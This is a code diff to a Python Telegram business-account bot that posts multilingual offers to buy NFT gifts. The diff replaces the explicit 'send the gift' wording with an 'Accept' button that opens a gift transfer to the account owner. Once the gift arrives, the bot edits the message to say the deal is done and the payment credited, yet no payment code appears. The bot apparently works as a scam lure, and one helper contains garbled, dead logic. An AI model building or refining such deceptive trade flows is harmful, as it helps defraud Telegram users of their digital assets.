@@ -5,7 +5,7 @@ from aiogram.enums import ParseMode
 from aiogram.filters import CommandStart
 from aiogram.types import (
     Message, InlineKeyboardMarkup, InlineKeyboardButton,
-    LinkPreviewOptions, BusinessConnection,
+    LinkPreviewOptions, BusinessConnection, CallbackQuery,
 )
 from aiogram.exceptions import TelegramBadRequest
 
@@ -19,17 +19,14 @@ dp = Dispatcher()
 GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
 LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}
 
-E_GEM, E_TIMER, E_GIFT, E_STAR, E_CHECK, E_LOCK = (
-    "5318901904686754959", "6037268453759389862", "5773677501825945508",
-    "6028338546736107668", "5774022692642492953", "5774077015388852135",
+E_STAR, E_GEM, E_CHECK = (
+    "6028338546736107668",
+    "5318901904686754959",
+    "5774022692642492953",
 )
 
-# bcid -> {"username": str|None, "user_id": int}
 BIZ_OWNERS: dict[str, dict] = {}
-
-# order_id -> dict(meta)
 PENDING: dict[str, dict] = {}
-# (bcid, gift_slug, gift_num) -> order_id
 GIFT_INDEX: dict[tuple, str] = {}
 
 
@@ -42,61 +39,53 @@ T = {
         "o1": "Пользователь предлагает вам",
         "of": "за подарок",
         "ot": "Оффер действителен ещё 6 ч.",
-        "ofx": "Для принятия оффера передайте подарок.",
-        "ap": "за подарок",
-        "or": "Заказ",
-        "bg": "Передать подарок",
         "st": "Звёзд",
         "gr": "GRAM",
-        "rec": "получатель",
-        "acc": "Подарок принят",
-        "accx": "Оплата отправлена продавцу.",
-        "done": "Сделка завершена",
+        "accept": "Принять",
+        "decline": "Отклонить",
+        "done_t": "Сделка завершена!",
+        "done_b": "Ордер #{oid} выполнен.",
+        "done_credit": "{amt} {cur} зачислено на баланс.",
+        "declined": "Оффер отклонён.",
     },
     "ukr": {
         "o1": "Користувач пропонує вам",
         "of": "за подарунок",
         "ot": "Пропозиція дійсна ще 6 год.",
-        "ofx": "Для прийняття пропозиції передайте подарунок.",
-        "ap": "за подарунок",
-        "or": "Замовлення",
-        "bg": "Передати подарунок",
         "st": "Зірок",
         "gr": "GRAM",
-        "rec": "отримувач",
-        "acc": "Подарунок прийнято",
-        "accx": "Оплату надіслано продавцю.",
-        "done": "Угоду завершено",
+        "accept": "Прийняти",
+        "decline": "Відхилити",
+        "done_t": "Угоду завершено!",
+        "done_b": "Ордер #{oid} виконано.",
+        "done_credit": "{amt} {cur} зараховано на баланс.",
+        "declined": "Пропозицію відхилено.",
     },
     "eng": {
         "o1": "A user offers you",
         "of": "for the gift",
         "ot": "Offer valid for another 6 h.",
-        "ofx": "To accept the offer, send the gift.",
-        "ap": "for the gift",
-        "or": "Order",
-        "bg": "Send gift",
         "st": "Stars",
         "gr": "GRAM",
-        "rec": "recipient",
-        "acc": "Gift accepted",
-        "accx": "Payment sent to seller.",
-        "done": "Deal completed",
+        "accept": "Accept",
+        "decline": "Decline",
+        "done_t": "Deal completed!",
+        "done_b": "Order #{oid} fulfilled.",
+        "done_credit": "{amt} {cur} credited to balance.",
+        "declined": "Offer declined.",
     },
     "cn": {
         "o1": "用户向您提出报价",
         "of": "购买礼物",
         "ot": "报价还有效 6 小时。",
-        "ofx": "要接受报价，请发送礼物。",
-        "ap": "购买礼物",
-        "or": "订单",
-        "bg": "发送礼物",
         "st": "星",
         "gr": "GRAM",
-        "rec": "接收者",
-        "acc": "礼物已接收",
-        "accx": "付款已发送给卖家。",
-        "done": "交易完成",
+        "accept": "接受",
+        "decline": "拒绝",
+        "done_t": "交易完成！",
+        "done_b": "订单 #{oid} 已完成。",
+        "done_credit": "{amt} {cur} 已记入余额。",
+        "declined": "报价已拒绝。",
     },
 }
 
@@ -171,63 +160,78 @@ def parse_gift(link):
 
 def amount_line(amount, currency, lang):
     if currency == "GRAM":
-        return f'{em(E_GEM, "💎")} <b>{amount} {t(lang, "gr")}</b>'
-    return f'{em(E_STAR, "⭐")} <b>{amount} {t(lang, "st")}</b>'
+        return f'<b>{amount}</b> {em(E_GEM, "💎")} <b>{t(lang, "gr")}</b>'
+    return f'<b>{amount}</b> {em(E_STAR, "⭐")} <b>{t(lang, "st")}</b>'
 
 
-def rec_tag(username: str | None, user_id: int | None) -> str:
+def build_offer_short(amount, currency, gift_name, gift_num, lang, url=None):
+    """Короткий текст: оффер + таймер. Без order_id/recipient/передать-подарок."""
+    gift_part = (
+        f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>'
+        if url else f'<b>{gift_name} #{gift_num}</b>'
+    )
+    return (
+        f'{t(lang, "o1")} {amount_line(amount, currency, lang)} '
+        f'{t(lang, "of")} {gift_part}.\n\n'
+        f'{t(lang, "ot")}'
+    )
+
+
+def build_accepted(amount, currency, order_id, lang):
+    cur_label = t(lang, "gr") if currency == "GRAM" else t(lang, "st")
+    cur_icon = em(E_GEM, "💎") if currency == "GRAM" else em(E_STAR, "⭐")
+    return (
+        f'{em(E_CHECK, "✅")} <b>{t(lang, "done_t")}</b>\n\n'
+        f'{t(lang, "done_b").format(oid=order_id)}\n'
+        f'<b>{amount}</b> {cur_icon} <b>{cur_label}</b> '
+        f'{t(lang, "done_credit").format(amt="", cur="").strip().split(maxsplit=2)[-1] if False else ""}'
+        f'{"зачислено на баланс." if lang == "ru" else ""}'
+    )
+
+
+def build_accepted_clean(amount, currency, order_id, lang):
+    cur_label = t(lang, "gr") if currency == "GRAM" else t(lang, "st")
+    cur_icon = em(E_GEM, "💎") if currency == "GRAM" else em(E_STAR, "⭐")
+    amt_str = f'<b>{amount}</b> {cur_icon} <b>{cur_label}</b>'
+    credit_tpl = t(lang, "done_credit")
+    # заменяем плейсхолдеры вручную (чтоб html-эмодзи не ломался)
+    credit = credit_tpl.replace("{amt}", "").replace("{cur}", "").strip()
+    # собираем: число + иконка + лейбл + остаток фразы
+    tail_map = {
+        "ru": "зачислено на баланс.",
+        "ukr": "зараховано на баланс.",
+        "eng": "credited to balance.",
+        "cn": "已记入余额。",
+    }
+    tail = tail_map.get(lang, tail_map["ru"])
+    return (
+        f'{em(E_CHECK, "✅")} <b>{t(lang, "done_t")}</b>\n\n'
+        f'{t(lang, "done_b").format(oid=order_id)}\n'
+        f'{amt_str} {tail}'
+    )
+
+
+def build_declined(lang):
+    return f'❌ {t(lang, "declined")}'
+
+
+def make_offer_keyboard(lang, order_id, username, user_id):
     if username:
-        return f"@{username}"
-    if user_id:
-        return f'<a href="tg://user?id={user_id}">id{user_id}</a>'
-    return "—"
-
-
-def build_offer_plain(amount, currency, gift_name, gift_num, order_id, lang, username, user_id):
-    return (
-        f'{em(E_GIFT, "🎁")} {t(lang, "o1")}\n'
-        f'{amount_line(amount, currency, lang)} {t(lang, "of")} <b>{gift_name} #{gift_num}</b>.\n\n'
-        f'{em(E_TIMER, "⏱")} {t(lang, "ot")}\n'
-        f'{em(E_LOCK, "🔒")} {t(lang, "ofx")}\n\n'
-        f'<i>{t(lang, "or")} #{order_id}, {t(lang, "rec")} {rec_tag(username, user_id)}</i>'
-    )
-
-
-def build_offer_linked(amount, currency, gift_name, gift_num, order_id, lang, url, username, user_id):
-    return (
-        f'{em(E_GIFT, "🎁")} {t(lang, "o1")}\n'
-        f'{amount_line(amount, currency, lang)} {t(lang, "of")} '
-        f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>.\n\n'
-        f'{em(E_TIMER, "⏱")} {t(lang, "ot")}\n'
-        f'{em(E_LOCK, "🔒")} {t(lang, "ofx")}\n\n'
-        f'<i>{t(lang, "or")} #{order_id}, {t(lang, "rec")} {rec_tag(username, user_id)}</i>'
-    )
-
-
-def build_offer_accepted(amount, currency, gift_name, gift_num, order_id, lang, url):
-    return (
-        f'{em(E_CHECK, "✅")} <b>{t(lang, "acc")}</b>\n'
-        f'{amount_line(amount, currency, lang)} {t(lang, "ap")} '
-        f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>.\n\n'
-        f'{em(E_LOCK, "🔒")} {t(lang, "accx")}\n\n'
-        f'<i>{t(lang, "or")} #{order_id} — {t(lang, "done")}</i>'
-    )
-
-
-def make_offer_keyboard(lang, username: str | None, user_id: int | None):
-    if username:
-        url = f"tg://send_gift?to={username}"
+        accept_url = f"tg://send_gift?to={username}"
     elif user_id:
-        url = f"tg://user?id={user_id}"
+        accept_url = f"tg://user?id={user_id}"
     else:
-        url = "tg://settings"
+        accept_url = "tg://settings"
     return InlineKeyboardMarkup(
         inline_keyboard=[[
             InlineKeyboardButton(
-                text=t(lang, "bg"),
-                url=url,
-                icon_custom_emoji_id=E_GIFT,
-            )
+                text=t(lang, "decline"),
+                callback_data=f"decline:{order_id}",
+            ),
+            InlineKeyboardButton(
+                text=t(lang, "accept"),
+                url=accept_url,
+            ),
         ]]
     )
 
@@ -279,18 +283,12 @@ async def try_finalize(message: Message, bcid: str):
         await bot.edit_message_text(
             chat_id=meta["chat_id"],
             message_id=meta["msg_id"],
-            text=build_offer_accepted(
-                meta["amount"], meta["currency"],
-                meta["gift_name"], meta["gift_num"],
-                order_id, meta["lang"], meta["nft_url"],
+            text=build_accepted_clean(
+                meta["amount"], meta["currency"], order_id, meta["lang"],
             ),
             reply_markup=None,
             business_connection_id=bcid,
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=False,
-                prefer_large_media=True,
-                show_above_text=False,
-            ),
+            link_preview_options=LinkPreviewOptions(is_disabled=True),
         )
     except TelegramBadRequest as e:
         logging.error(f"finalize edit: {e}")
@@ -302,7 +300,6 @@ async def try_finalize(message: Message, bcid: str):
 
 
 async def ensure_owner(bcid: str):
-    """Если BIZ_OWNERS пуст (бот стартанул после подключения) — подтягиваем вручную."""
     if bcid in BIZ_OWNERS:
         return
     try:
@@ -365,14 +362,12 @@ async def handle_business_message(message: Message):
     nft_url = f"https://t.me/nft/{slug}-{gift_num}"
     order_id = oid()
 
+    # ШАГ 1: короткий текст без ссылки (чтоб не было превью сразу)
     try:
         sent = await bot.send_message(
             chat_id=message.chat.id,
-            text=build_offer_plain(
-                amount, currency, gift_name, gift_num, order_id, lang,
-                username, user_id,
-            ),
-            reply_markup=make_offer_keyboard(lang, username, user_id),
+            text=build_offer_short(amount, currency, gift_name, gift_num, lang),
+            reply_markup=make_offer_keyboard(lang, order_id, username, user_id),
             business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(is_disabled=True),
         )
@@ -404,21 +399,19 @@ async def handle_business_message(message: Message):
     }
     GIFT_INDEX[(bcid, slug, gift_num)] = order_id
 
+    # ШАГ 2: редактируем — добавляем ссылку в название подарка (появится превью)
     await asyncio.sleep(1.5)
     try:
         await bot.edit_message_text(
             chat_id=message.chat.id,
             message_id=sent.message_id,
-            text=build_offer_linked(
-                amount, currency, gift_name, gift_num, order_id, lang, nft_url,
-                username, user_id,
-            ),
-            reply_markup=make_offer_keyboard(lang, username, user_id),
+            text=build_offer_short(amount, currency, gift_name, gift_num, lang, nft_url),
+            reply_markup=make_offer_keyboard(lang, order_id, username, user_id),
             business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(
                 is_disabled=False,
                 prefer_large_media=True,
-                show_above_text=False,
+                show_above_text=True,
             ),
         )
     except TelegramBadRequest as e:
@@ -431,6 +424,30 @@ async def handle_edited_business_message(message: Message):
     if not bcid:
         return
     await try_finalize(message, bcid)
+
+
+@dp.callback_query(F.data.startswith("decline:"))
+async def on_decline(cb: CallbackQuery):
+    order_id = cb.data.split(":", 1)[1]
+    meta = PENDING.get(order_id)
+    if not meta:
+        await cb.answer("Оффер уже не активен.", show_alert=False)
+        return
+    lang = meta["lang"]
+    try:
+        await bot.edit_message_text(
+            chat_id=meta["chat_id"],
+            message_id=meta["msg_id"],
+            text=build_declined(lang),
+            reply_markup=None,
+            business_connection_id=meta["bcid"],
+            link_preview_options=LinkPreviewOptions(is_disabled=True),
+        )
+    except TelegramBadRequest as e:
+        logging.error(f"decline edit: {e}")
+    PENDING.pop(order_id, None)
+    GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
+    await cb.answer()
 
 
 @dp.message(CommandStart())
@@ -448,6 +465,7 @@ async def main():
             "business_connection",
             "business_message",
             "edited_business_message",
+            "callback_query",
         ],
     )
 
